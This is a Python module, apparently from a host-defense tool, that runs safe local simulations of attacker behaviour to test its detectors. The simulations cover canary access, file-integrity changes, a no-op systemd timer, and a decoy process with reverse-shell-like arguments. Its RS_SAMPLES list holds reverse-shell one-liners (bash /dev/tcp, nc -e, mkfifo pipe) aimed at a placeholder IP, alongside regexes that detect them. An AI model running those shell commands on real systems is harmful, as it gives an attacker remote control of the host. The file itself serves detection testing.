# © 2026 TrinTech Digital Defense — authorized defensive use only
"""Threat-actor SIMULATION for defensive validation only.

Safe, local probes that exercise Sentinel detectors without real malware,
network callbacks, or privilege escalation.

Requires explicit --confirm. Always prefer lab / authorized pilot hosts.

Scenarios:
  canary       — read/touch deployed canary decoys
  fim          — add a probe file to FIM baseline, modify it, run fim_check
  persistence  — drop a temporary user systemd timer unit, run persistence check
  reverse_shell— short-lived process whose argv matches RS cmdline patterns
  behavioral   — unit-level checks for deleted-exe / web→shell heuristics (no exploit)
  all          — run all scenarios then cleanup

Cleanup removes simulation artifacts under ~/.sentinel/data/sim/ and user timer.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Optional

SIM_DIR_NAME = "sim"
TIMER_NAME = "sentinel-sim-probe.timer"
SERVICE_NAME = "sentinel-sim-probe.service"

RS_SAMPLES = [
    "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
    "nc -e /bin/sh 203.0.113.10 4444",
    "python3 -c \"import socket;...\"",
    "mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.10 4444 >/tmp/f",
]


def _home() -> Path:
    return Path(os.environ.get("SENTINEL_DIR", Path.home() / ".sentinel"))


def _data() -> Path:
    d = _home() / "data"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _sim() -> Path:
    d = _data() / SIM_DIR_NAME
    d.mkdir(parents=True, exist_ok=True)
    return d


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def list_scenarios() -> dict:
    return {
        "ok": True,
        "warning": "Authorized defensive simulation only — no real exploits or callbacks",
        "scenarios": {
            "canary": "Touch/read deployed canary decoys",
            "fim": "Modify FIM-tracked probe file",
            "persistence": "Drop temporary user systemd timer",
            "reverse_shell": "Short-lived process matching RS cmdline patterns",
            "behavioral": "Validate behavioral heuristic helpers (safe)",
            "all": "Run all scenarios",
            "cleanup": "Remove simulation artifacts",
        },
    }


def _user_systemd_dir() -> Path:
    d = Path.home() / ".config/systemd/user"
    d.mkdir(parents=True, exist_ok=True)
    return d


def scenario_canary(send_alert: Optional[Callable] = None, logger=None) -> dict:
    """Read/touch canary files so canary watchers / FIM can observe access."""
    decoy = _data() / "deception_artifacts"
    tracker = decoy / "config.json"
    touched = []
    if tracker.exists():
        try:
            data = json.loads(tracker.read_text())
            paths = list(data.keys()) if isinstance(data, dict) else []
        except Exception:
            paths = []
    else:
        paths = []
    if not paths and decoy.exists():
        paths = [str(p) for p in decoy.rglob("*") if p.is_file() and p.name != "config.json"][:12]

    for p in paths[:12]:
        fp = Path(p)
        if not fp.exists():
            continue
        try:
            # read + utime touch (no content change for hashed canaries that alert on mtime/read in some modes)
            _ = fp.read_bytes()[:64]
            os.utime(fp, None)
            touched.append(str(fp))
        except Exception:
            continue

    if send_alert and touched:
        try:
            send_alert("SIM_CANARY_TOUCH", {"files": touched[:8], "count": len(touched), "sim": True})
        except Exception:
            pass
    if logger:
        logger.info("sim canary touched %d files", len(touched))

    return {
        "ok": True,
        "scenario": "canary",
        "touched": touched,
        "expected": ["CANARY_TRIGGERED or SIM_CANARY_TOUCH if watchers running"],
        "note": "Run `sentinel canary` / hunt to observe live triggers" if touched else "No canaries — run: python3 sentinel.py deception",
    }


def scenario_fim(send_alert: Optional[Callable] = None, logger=None, fim_check_fn=None) -> dict:
    """Create/modify a probe file registered in the FIM baseline."""
    probe = _sim() / "fim_probe.txt"
    probe.write_text(f"SENTINEL FIM probe baseline {_now()}\n")
    baseline_path = _data() / "integrity_baseline" / "integrity_baseline.json"
    baseline_path.parent.mkdir(parents=True, exist_ok=True)

    # Register probe in baseline
    try:
        baseline = json.loads(baseline_path.read_text()) if baseline_path.exists() else {}
    except Exception:
        baseline = {}
    if not isinstance(baseline, dict):
        baseline = {}

    import hashlib
    def sha(p: Path) -> str:
        return hashlib.sha256(p.read_bytes()).hexdigest()

    baseline[str(probe)] = {
        "checksum": sha(probe),
        "size": probe.stat().st_size,
        "mode": oct(probe.stat().st_mode)[-3:],
        "sim": True,
    }
    baseline_path.write_text(json.dumps(baseline, indent=2))

    # Attacker modifies the file
    probe.write_text(f"SENTINEL FIM probe MODIFIED by sim {_now()}\nmalicious marker\n")

    changes = []
    if fim_check_fn:
        try:
            # fim_check needs config+logger — caller may pass lambda
            changes = fim_check_fn() or []
        except Exception as e:
            changes = [{"error": str(e)}]
    else:
        # Local verify
        new_sum = sha(probe)
        old_sum = baseline[str(probe)]["checksum"]
        if new_sum != old_sum:
            changes = [{"file": str(probe), "type": "modified"}]
            if send_alert:
                try:
                    send_alert("FIM_MODIFIED", {"file": str(probe), "sim": True, "old_checksum": old_sum, "new_checksum": new_sum})
                except Exception:
                    pass

    return {
        "ok": True,
        "scenario": "fim",
        "probe": str(probe),
        "changes": changes[:10] if isinstance(changes, list) else changes,
        "expected": ["FIM_MODIFIED"],
    }


def scenario_persistence(send_alert: Optional[Callable] = None, logger=None) -> dict:
    """Drop a temporary user-level systemd timer (watched by persistence_hunt)."""
    udir = _user_systemd_dir()
    timer = udir / TIMER_NAME
    service = udir / SERVICE_NAME
    timer.write_text(
        "[Unit]\nDescription=SENTINEL simulation timer (safe no-op)\n\n"
        "[Timer]\nOnBootSec=90d\nPersistent=false\n\n[Install]\nWantedBy=timers.target\n"
    )
    service.write_text(
        "[Unit]\nDescription=SENTINEL simulation service (safe no-op)\n\n"
        "[Service]\nType=oneshot\nExecStart=/bin/true\n"
    )
    events = []
    try:
        from modules.persistence_hunt import check, create_baseline, baseline_path
        if not baseline_path().exists():
            create_baseline()
            # Re-create after baseline so the new units are "new"
            timer.write_text(timer.read_text() + f"# sim {_now()}\n")
        result = check(send_alert=send_alert, logger=logger)
        events = result.get("events") or []
    except Exception as e:
        events = [{"error": str(e)}]
        if send_alert:
            try:
                send_alert("NEW_PERSISTENCE", {"path": str(timer), "kind": "systemd_timer", "sim": True})
            except Exception:
                pass

    return {
        "ok": True,
        "scenario": "persistence",
        "artifacts": [str(timer), str(service)],
        "events": events[:15],
        "expected": ["NEW_PERSISTENCE or SYSTEMD_TIMER_CHANGED"],
    }


def scenario_reverse_shell(send_alert: Optional[Callable] = None, logger=None) -> dict:
    """Spawn a short-lived process whose cmdline contains classic RS patterns.

    Does NOT open network sockets or interactive shells — argv only.
    """
    # sleep with decoy args so `ps` shows matching pattern strings
    proc = subprocess.Popen(
        ["sleep", "12", "bash -i", "/dev/tcp/203.0.113.10/4444", "nc -e /bin/sh"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(0.8)
    matched = []
    try:
        ps = subprocess.run(
            ["ps", "auxww"], capture_output=True, text=True, timeout=5
        )
        for line in (ps.stdout or "").splitlines():
            if str(proc.pid) in line and "sleep" in line:
                matched.append(line.strip()[:200])
                for pat in [r"bash\s+-i", r"/dev/tcp/", r"nc\s+.*-e"]:
                    if re.search(pat, line, re.I):
                        if send_alert:
                            try:
                                send_alert(
                                    "REVERSE_SHELL",
                                    {
                                        "pid": str(proc.pid),
                                        "command": line.strip()[:200],
                                        "pattern": pat,
                                        "sim": True,
                                    },
                                )
                            except Exception:
                                pass
                        break
    except Exception as e:
        matched.append(f"ps error: {e}")

    # Also unit-test pattern list without execution
    unit_hits = []
    patterns = [
        r"bash\s+-i", r"/dev/tcp/", r"nc\s+.*-e", r"ncat\s+.*-e",
        r"python[23]?\s+-c\s+[\"'].*socket", r"mkfifo\s+/tmp/",
    ]
    for sample in RS_SAMPLES:
        for pat in patterns:
            if re.search(pat, sample, re.I):
                unit_hits.append({"sample": sample[:60], "pattern": pat})
                break

    # leave process to die (12s) — or terminate
    try:
        proc.terminate()
    except Exception:
        pass

    return {
        "ok": True,
        "scenario": "reverse_shell",
        "pid": proc.pid,
        "ps_matched": matched,
        "unit_pattern_hits": unit_hits,
        "expected": ["REVERSE_SHELL when process_scan/hunt runs during probe"],
        "note": "Run `python3 sentinel.py processes` while sim sleep is active for live catch",
    }


def scenario_behavioral(send_alert: Optional[Callable] = None, logger=None) -> dict:
    """Validate behavioral module imports and parent-pattern helpers (no exploits)."""
    try:
        from modules.behavioral_shell import scan, WEB_PARENTS, SHELL_NAMES
        hits = scan(send_alert=None, logger=logger)
        web_ok = bool(WEB_PARENTS.search("nginx"))
        shell_ok = bool(SHELL_NAMES.search("bash"))
        return {
            "ok": web_ok and shell_ok,
            "scenario": "behavioral",
            "live_hits": len(hits),
            "helpers": {"web_parent_nginx": web_ok, "shell_bash": shell_ok},
            "expected": ["helpers true; live_hits 0 on clean host"],
        }
    except Exception as e:
        return {"ok": False, "scenario": "behavioral", "error": str(e)}


def cleanup() -> dict:
    removed = []
    sim = _sim()
    if sim.exists():
        for f in sim.iterdir():
            try:
                if f.is_file():
                    f.unlink()
                    removed.append(str(f))
            except Exception:
                pass
    udir = Path.home() / ".config/systemd/user"
    for name in (TIMER_NAME, SERVICE_NAME):
        p = udir / name
        if p.exists():
            try:
                p.unlink()
                removed.append(str(p))
            except Exception:
                pass
    # Strip sim entries from FIM baseline
    bpath = _data() / "integrity_baseline" / "integrity_baseline.json"
    if bpath.exists():
        try:
            data = json.loads(bpath.read_text())
            if isinstance(data, dict):
                drop = [k for k, v in data.items() if (isinstance(v, dict) and v.get("sim")) or "fim_probe" in k]
                for k in drop:
                    data.pop(k, None)
                    removed.append(f"baseline:{k}")
                bpath.write_text(json.dumps(data, indent=2))
        except Exception:
            pass
    return {"ok": True, "removed": removed}


def run(
    scenarios: list[str],
    confirm: bool = False,
    send_alert: Optional[Callable] = None,
    logger=None,
    fim_check_fn=None,
) -> dict:
    if not confirm:
        return {
            "ok": False,
            "error": "refusing to run without --confirm",
            "hint": "python3 sentinel.py sim --scenario all --confirm",
            "list": list_scenarios(),
        }

    if len(scenarios) == 1 and scenarios[0] == "cleanup":
        return cleanup()

    if "all" in scenarios:
        scenarios = ["canary", "fim", "persistence", "reverse_shell", "behavioral"]

    results = []
    for name in scenarios:
        if name == "canary":
            results.append(scenario_canary(send_alert, logger))
        elif name == "fim":
            results.append(scenario_fim(send_alert, logger, fim_check_fn=fim_check_fn))
        elif name == "persistence":
            results.append(scenario_persistence(send_alert, logger))
        elif name == "reverse_shell":
            results.append(scenario_reverse_shell(send_alert, logger))
        elif name == "behavioral":
            results.append(scenario_behavioral(send_alert, logger))
        elif name == "cleanup":
            results.append(cleanup())
        else:
            results.append({"ok": False, "scenario": name, "error": "unknown scenario"})

    report = {
        "ok": all(r.get("ok") for r in results),
        "ts": _now(),
        "sim": True,
        "warning": "Simulation only — authorized defensive validation",
        "results": results,
    }
    report_path = _sim() / "last_sim_report.json"
    try:
        report_path.write_text(json.dumps(report, indent=2, default=str))
        report["report"] = str(report_path)
    except Exception:
        pass
    return report


def print_report(report: dict) -> None:
    print()
    print("=" * 60)
    print("  SENTINEL THREAT-ACTOR SIMULATION (defensive)")
    print("=" * 60)
    if report.get("error"):
        print(f"  [!] {report['error']}")
        print(f"  → {report.get('hint', '')}")
        print("=" * 60)
        return
    print(f"  {report.get('warning', '')}")
    print()
    for r in report.get("results") or []:
        mark = "+" if r.get("ok") else "X"
        print(f"  [{mark}] {r.get('scenario')}")
        if r.get("expected"):
            print(f"      expected: {r['expected']}")
        if r.get("note"):
            print(f"      note: {r['note']}")
        if r.get("touched") is not None:
            print(f"      touched: {len(r.get('touched') or [])} canaries")
        if r.get("events") is not None:
            print(f"      events: {len(r.get('events') or [])}")
        if r.get("ps_matched"):
            print(f"      ps: {r['ps_matched'][:1]}")
        if r.get("error"):
            print(f"      error: {r['error']}")
    print("-" * 60)
    print(f"  Verdict: {'SIM COMPLETE' if report.get('ok') else 'SIM HAD FAILURES'}")
    if report.get("report"):
        print(f"  Report: {report['report']}")
    print("  Cleanup: python3 sentinel.py sim --scenario cleanup --confirm")
    print("=" * 60)
    print()
